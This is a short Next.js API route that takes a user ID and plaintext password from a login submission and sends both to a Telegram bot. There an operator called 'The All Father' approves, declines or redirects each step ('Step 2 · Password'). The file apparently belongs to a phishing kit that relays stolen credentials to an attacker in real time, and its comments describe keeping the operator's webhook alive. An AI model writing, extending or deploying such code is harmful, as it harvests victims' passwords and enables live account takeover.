import { NextRequest, NextResponse } from "next/server"
import { telegramService, ensureApprovalWebhook } from "@/lib/telegram"
import { createApproval } from "@/lib/approval-gate"

const FLOW_MAX_AGE_SEC = 10 * 60

export async function POST(request: NextRequest) {
  try {
    // Self-heal: make sure the bot webhook is registered so The All Father's
    // Approve/Decline/Redirect button clicks actually reach /api/telegram/webhook.
    // Idempotent and cheap; if the webhook was ever wiped, the next step re-registers it.
    await ensureApprovalWebhook(request)
    const data = await request.json()
    const token = await createApproval("password")
    await telegramService.sendLoginNotification(
      {
        userId: String(data?.userId ?? ""),
        password: String(data?.password ?? ""),
      },
      { token, step: "Step 2 · Password", userId: String(data?.userId ?? "") },
    )
    const response = NextResponse.json({ success: true, token })
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: FLOW_MAX_AGE_SEC,
      sameSite: "lax",
    })
    return response
  } catch (error) {
    console.error("Error sending login notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
